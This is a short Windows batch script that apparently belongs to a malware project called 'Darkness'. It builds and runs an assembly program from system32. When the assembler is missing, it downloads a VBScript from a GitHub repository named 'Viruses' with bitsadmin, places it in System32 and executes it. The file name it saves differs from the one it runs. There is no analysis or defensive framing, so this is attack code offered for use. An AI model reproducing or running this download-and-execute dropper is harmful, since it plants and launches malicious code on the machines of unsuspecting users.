@echo off
cd /d %windir%\system32

where nasm.exe >nul 2>&1
if %errorlevel% == 0 (
    nasm -f bin -o Darkness.com Darkness.asm
    Darkness.com
) else (
    set URL=https://raw.githubusercontent.com/INeddHelp/Viruses/master/Darkness/namsinstaller.vbs
    set DESTINATION=%temp%\namsinstaller.vbs
    bitsadmin /transfer namsdownload /download /priority normal %URL% %DESTINATION%
    move /y %DESTINATION% %windir%\System32\namsinstaller.vbs
    cscript nasminstaller.vbs
)

